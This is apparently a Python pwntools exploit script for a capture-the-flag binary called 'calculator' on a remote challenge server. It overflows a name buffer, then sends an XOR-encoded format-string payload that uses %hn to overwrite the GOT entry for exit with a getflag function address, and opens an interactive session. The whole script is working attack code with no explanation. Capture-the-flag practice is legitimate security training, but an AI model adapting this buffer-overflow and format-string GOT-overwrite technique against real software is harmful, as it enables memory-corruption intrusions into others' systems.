#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

# io = process('./calculator')
io = remote('chal.noxale.com', 5678)
elf = ELF('./calculator')
io.recvuntil('name?')
name = 'a' * (0x2c - 0x10) + p32(0x6A4B825)
io.send(name)

getflag = 0x8048596
exit_got = elf.got['exit']
# 0x804a024

source = p32(exit_got) + '%' + str((getflag & 0xffff - 4)) + 'c%12$hn'
''''''
# key = 0x5F7B4153
pay1 = ''
pay2 = ''
pay3 = ''
pay4 = ''

lenth = len(source) - 4
for i in range(0, lenth):
    pay1 += chr(ord(source[i]) ^ 0x53)
pay1 += source[lenth::]

pay2 += pay1[0]
for i in range(1, lenth+1):
    pay2 += chr(ord(pay1[i]) ^ 0x41)
pay2 += pay1[lenth+1::]

pay3 += pay2[0: 2]
for i in range(2, lenth + 2):
    pay3 += chr(ord(pay2[i]) ^ 0x7b)
pay3 += pay2[lenth+2::]

pay4 += pay3[0:3]
for i in range(3, lenth+3):
    pay4 += chr(ord(pay3[i]) ^ 0x5f)
pay4 += pay3[lenth+3::]



io.recvuntil('please')
io.send(pay4)
io.recvuntil('name: ')

io.interactive()


